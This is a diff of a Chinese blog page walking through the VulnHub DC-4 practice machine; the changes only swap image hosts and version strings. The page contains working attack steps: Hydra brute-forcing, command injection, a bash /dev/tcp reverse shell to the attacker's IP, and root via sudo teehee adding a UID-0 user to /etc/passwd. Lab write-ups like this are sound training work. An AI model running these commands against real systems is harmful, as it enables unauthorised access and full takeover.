@@ -51,7 +51,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
 <meta property="article:published_time" content="2026-03-13T04:00:00.000Z">
-<meta property="article:modified_time" content="2026-05-01T02:37:23.459Z">
+<meta property="article:modified_time" content="2026-05-14T10:04:40.420Z">
 <meta property="article:author" content="wr0ld">
 <meta property="article:tag" content="靶机渗透">
 <meta property="article:tag" content="VulnHub">
@@ -67,7 +67,7 @@
   <!-- feed -->
   
 
-  <link rel="stylesheet" href="/css/main.css?v=mp2fxa5c">
+  <link rel="stylesheet" href="/css/main.css?v=mp5bt8n7">
 
 
   
@@ -76,7 +76,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-13T12:00:00+08:00","dateModified":"2026-05-01T10:37:23+08:00","datePublished":"2026-03-13T12:00:00+08:00","description":"","headline":"VulnHub DC-4 靶机渗透测试笔记","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/69aac692/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/69aac692/","keywords":"靶机渗透, VulnHub, vulnhub-DC, 提权","thumbnailUrl":"/images/VulnHub.jpg","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-13T12:00:00+08:00","dateModified":"2026-05-14T18:04:40+08:00","datePublished":"2026-03-13T12:00:00+08:00","description":"","headline":"VulnHub DC-4 靶机渗透测试笔记","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/69aac692/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/69aac692/","keywords":"靶机渗透, VulnHub, vulnhub-DC, 提权","thumbnailUrl":"/images/VulnHub.jpg","image":1}</script>
   
 </head>
 <body><div class="reading-progress-bar"></div>
@@ -130,11 +130,11 @@
 <hr>
 <h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1 主机发现"></a>1.1 主机发现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image1.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image1.png"></p>
 <p>本机 IP：<code>192.168.168.128</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.168.0/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image2.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image2.png"></p>
 <p><strong>扫描结果</strong></p>
 <ul>
 <li>192.168.168.1 → VM8 网卡</li>
@@ -145,28 +145,28 @@
 </ul>
 <h3 id="1-2-端口与服务扫描"><a href="#1-2-端口与服务扫描" class="headerlink" title="1.2 端口与服务扫描"></a>1.2 端口与服务扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A 192.168.168.130</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image3.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image3.png"></p>
 <p>开放了 22 和 80，80 是 Web 服务。</p>
 <hr>
 <h2 id="二、Web-信息收集"><a href="#二、Web-信息收集" class="headerlink" title="二、Web 信息收集"></a>二、Web 信息收集</h2><h3 id="2-1-访问网站"><a href="#2-1-访问网站" class="headerlink" title="2.1 访问网站"></a>2.1 访问网站</h3><p>访问目标网站，什么都没有：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image4.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image4.png"></p>
 <p>页面源码也没什么：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image5.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image5.png"></p>
 <h3 id="2-2-目录扫描"><a href="#2-2-目录扫描" class="headerlink" title="2.2 目录扫描"></a>2.2 目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.130/</span><br></pre></td></tr></table></figure>
 
 <p>好像也没什么：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image6.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image6.png"></p>
 <p>插件也什么都没有：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image7.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image7.png"></p>
 <h3 id="2-3-检查-SSH-和-Nginx-版本漏洞"><a href="#2-3-检查-SSH-和-Nginx-版本漏洞" class="headerlink" title="2.3 检查 SSH 和 Nginx 版本漏洞"></a>2.3 检查 SSH 和 Nginx 版本漏洞</h3><p>对了 SSH 和 Nginx 有没有版本漏洞？</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image8.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image8.png"></p>
 <p>感觉都不行，那只能爆破了。</p>
 <hr>
 <h2 id="三、Web-登录爆破"><a href="#三、Web-登录爆破" class="headerlink" title="三、Web 登录爆破"></a>三、Web 登录爆破</h2><h3 id="3-1-Burp-Suite-爆破"><a href="#3-1-Burp-Suite-爆破" class="headerlink" title="3.1 Burp Suite 爆破"></a>3.1 Burp Suite 爆破</h3><p>bp 爆破用的 fuzzDicts 字典里的：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image9.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image9.png"></p>
 <p>跑出来了：<code>admin / happy</code></p>
 <p>登录：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image10.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image10.png"></p>
 <h3 id="3-2-Hydra-爆破（更快）"><a href="#3-2-Hydra-爆破（更快）" class="headerlink" title="3.2 Hydra 爆破（更快）"></a>3.2 Hydra 爆破（更快）</h3><p>还有这种简单的密码爆破，没有什么验证，可以使用 hydra 爆破，比 bp 快多了：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P rockyou.txt 192.168.168.169 http-post-form <span class="string">&quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;</span> -F</span><br></pre></td></tr></table></figure>
 
@@ -186,22 +186,22 @@
 <li>关键点：如果登录后页面出现了 logout 这个词，说明登录成功了！</li>
 <li>-F: 只要试对一个密码，就赶紧停下来。</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image15.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image15.png"></p>
 <p>很快，半分钟不要就跑出来了。</p>
 <blockquote>
 <p>备注：这里遇到个问题，只有谷歌浏览器能登录账号密码，bp 内置的谷歌和 edge 都登不上，后来发现和 cookie 有关，能把谷歌里的 cookie 写到 bp 里就能重新登了，又是环境问题，重装了一下，全都好了，ip 变成了 169。</p>
 </blockquote>
 <hr>
 <h2 id="四、命令注入"><a href="#四、命令注入" class="headerlink" title="四、命令注入"></a>四、命令注入</h2><h3 id="4-1-发现命令执行功能"><a href="#4-1-发现命令执行功能" class="headerlink" title="4.1 发现命令执行功能"></a>4.1 发现命令执行功能</h3><p>点击命令里面：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image11.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image11.png"></p>
 <p>List Files：You have selected: ls -l</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image12.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image12.png"></p>
 <p>Disk Usage：You have selected: du -h</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image13.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image13.png"></p>
 <p>Disk Free：You have selected: df -h</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image14.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image14.png"></p>
 <h3 id="4-2-抓包分析"><a href="#4-2-抓包分析" class="headerlink" title="4.2 抓包分析"></a>4.2 抓包分析</h3><p>bp 抓包：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image16.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image16.png"></p>
 <p><code>radio=whoami</code> 这就是个命令执行的地方。</p>
 <h3 id="4-3-反弹-Shell"><a href="#4-3-反弹-Shell" class="headerlink" title="4.3 反弹 Shell"></a>4.3 反弹 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.168.128/5678 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
@@ -215,41 +215,41 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 5678</span><br></pre></td></tr></table></figure>
 
 <p>成功监听到：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image17.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image17.png"></p>
 <hr>
-<h2 id="五、后渗透信息收集"><a href="#五、后渗透信息收集" class="headerlink" title="五、后渗透信息收集"></a>五、后渗透信息收集</h2><h3 id="5-1-查看基础信息"><a href="#5-1-查看基础信息" class="headerlink" title="5.1 查看基础信息"></a>5.1 查看基础信息</h3><p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image18.png"></p>
+<h2 id="五、后渗透信息收集"><a href="#五、后渗透信息收集" class="headerlink" title="五、后渗透信息收集"></a>五、后渗透信息收集</h2><h3 id="5-1-查看基础信息"><a href="#5-1-查看基础信息" class="headerlink" title="5.1 查看基础信息"></a>5.1 查看基础信息</h3><p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image18.png"></p>
 <h3 id="5-2-sudo-权限查看"><a href="#5-2-sudo-权限查看" class="headerlink" title="5.2 sudo 权限查看"></a>5.2 sudo 权限查看</h3><p>sudo -l 提示无 tty：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image19.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image19.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>再次输入 sudo -l：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image20.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image20.png"></p>
 <p>需要密码，happy 密码错误（正确才奇怪，都不是同一个东西）。</p>
 <h3 id="5-3-SUID-文件查找"><a href="#5-3-SUID-文件查找" class="headerlink" title="5.3 SUID 文件查找"></a>5.3 SUID 文件查找</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image21.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image21.png"></p>
 <p>最后有一个 sh，得注意一下：<code>/home/jim/test.sh</code></p>
 <h3 id="5-4-查看-etc-passwd"><a href="#5-4-查看-etc-passwd" class="headerlink" title="5.4 查看 &#x2F;etc&#x2F;passwd"></a>5.4 查看 &#x2F;etc&#x2F;passwd</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure>
 
 <p>找到点信息，exim4 有很多已知提权漏洞：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image22.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image22.png"></p>
 <p>查看到有三个用户：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image23.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image23.png"></p>
 <p>charles、jim、sam</p>
 <h3 id="5-5-翻查用户目录"><a href="#5-5-翻查用户目录" class="headerlink" title="5.5 翻查用户目录"></a>5.5 翻查用户目录</h3><p>分别看看里面有什么：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image24.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image24.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> test.sh</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image25.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image25.png"></p>
 <p>“学 bash 吧，他们说。” “bash 很好用，他们说。” “但我宁愿用头撞墙。”</p>
 <p>没什么用。</p>
 <p>mbox 没权限：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image26.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image26.png"></p>
 <p>有个密码备份：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image27.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image27.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> old-passwords.bak</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image28.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image28.png"></p>
 <p>一个密码本，内容不是很多，直接鼠标复制。</p>
 <hr>
 <h2 id="六、SSH-爆破"><a href="#六、SSH-爆破" class="headerlink" title="六、SSH 爆破"></a>六、SSH 爆破</h2><h3 id="6-1-创建用户名字典"><a href="#6-1-创建用户名字典" class="headerlink" title="6.1 创建用户名字典"></a>6.1 创建用户名字典</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;jim\ncharles\nsammy&quot;</span> &gt; users.txt</span><br></pre></td></tr></table></figure>
@@ -259,7 +259,7 @@
 <li><code>&gt;</code> 为覆盖</li>
 <li><code>&gt;&gt;</code> 为追加</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image30.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image30.png"></p>
 <h3 id="6-2-Hydra-爆破-SSH"><a href="#6-2-Hydra-爆破-SSH" class="headerlink" title="6.2 Hydra 爆破 SSH"></a>6.2 Hydra 爆破 SSH</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.txt -P ./passwd.txt 192.168.168.169 ssh</span><br></pre></td></tr></table></figure>
 
 <p><strong>hydra 常用参数：</strong></p>
@@ -304,23 +304,23 @@
 </tr>
 </tbody></table>
 <p>爆破出一个：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image31.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image31.png"></p>
 <p><code>login: jim   password: jibril04</code></p>
 <hr>
 <h2 id="七、SSH-登录与横向移动"><a href="#七、SSH-登录与横向移动" class="headerlink" title="七、SSH 登录与横向移动"></a>七、SSH 登录与横向移动</h2><h3 id="7-1-登录-jim"><a href="#7-1-登录-jim" class="headerlink" title="7.1 登录 jim"></a>7.1 登录 jim</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jim@192.168.168.169</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image32.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image32.png"></p>
 <p>连接上了，没有 sudo 可用。</p>
 <h3 id="7-2-查看邮件"><a href="#7-2-查看邮件" class="headerlink" title="7.2 查看邮件"></a>7.2 查看邮件</h3><p>看一下之前打不开的 mbox：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image33.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image34.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image33.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image34.png"></p>
 <p>去邮箱里找，之前找到过 exim4 服务：<code>Debian-exim:x:108:112::/var/spool/exim4:/bin/false</code></p>
 <p>&#x2F;var&#x2F;spool&#x2F;exim4 无权限进不去：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image35.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image35.png"></p>
 <p>计划任务也没权限看：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image36.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image36.png"></p>
 <p>mail 里面有个 www-data 没权限看，只能看 jim：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image37.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image37.png"></p>
 <p>在邮件里找到密码：<code>Password is: ^xHhA&amp;hvim0y</code></p>
 <h3 id="7-3-切换到-charles"><a href="#7-3-切换到-charles" class="headerlink" title="7.3 切换到 charles"></a>7.3 切换到 charles</h3><p>su - charles 和 su charles 的区别：</p>
 <ul>
@@ -330,7 +330,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su - charles</span><br><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
 
 <p>找到 teehee。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image38.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image38.png"></p>
 <hr>
 <h2 id="八、teehee-提权"><a href="#八、teehee-提权" class="headerlink" title="八、teehee 提权"></a>八、teehee 提权</h2><p>还想在 <a target="_blank" rel="noopener" href="https://gtfobins.org/">https://gtfobins.org/</a> 里找的，结果找不到，那就去网上搜：</p>
 <p><strong>teehee 是 tee 命令的变种</strong>，可以把内容写入文件，如果有 sudo 权限执行它，就能以 root 身份往 &#x2F;etc&#x2F;passwd 写入新用户：</p>
@@ -339,9 +339,9 @@
 <p>这行意思是添加一个<strong>没有密码、UID 为 0（root权限）</strong>的用户 hack，然后：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su hack</span><br><span class="line"><span class="built_in">whoami</span>  <span class="comment"># root</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image39.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image39.png"></p>
 <p>成功拿到 flag：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image40.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-4_image40.png"></p>
 <hr>
 <h2 id="九、渗透流程总结"><a href="#九、渗透流程总结" class="headerlink" title="九、渗透流程总结"></a>九、渗透流程总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">信息收集（nmap）</span><br><span class="line">    ↓</span><br><span class="line">发现 Web 登录页 → Burp Suite / Hydra 爆破 → admin/happy</span><br><span class="line">    ↓</span><br><span class="line">命令执行功能 → 反弹 Shell → www-data</span><br><span class="line">    ↓</span><br><span class="line">/home/jim/backups/old-passwords.bak → Hydra 爆破 SSH → jim/jibril04</span><br><span class="line">    ↓</span><br><span class="line">jim 邮件中发现密码 → 切换 charles</span><br><span class="line">    ↓</span><br><span class="line">sudo teehee → 写入 /etc/passwd → root → flag ✅</span><br></pre></td></tr></table></figure>
 
@@ -832,7 +832,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=mp2fxa5e" defer></script>
+<script src="/js/main.js?v=mp5bt8n9" defer></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -1096,7 +1096,7 @@
 <script src="/js/plugins/hotkeys.js"></script>
 
 <!-- Achievements / Card System -->
-<script src="/js/plugins/achievements.js?v=mp2fxa5f"></script>
+<script src="/js/plugins/achievements.js?v=mp5bt8n9"></script>
 
 <!-- Special Days - 节日彩蛋系统 -->
 <script src="/js/plugins/special-days.js"></script>
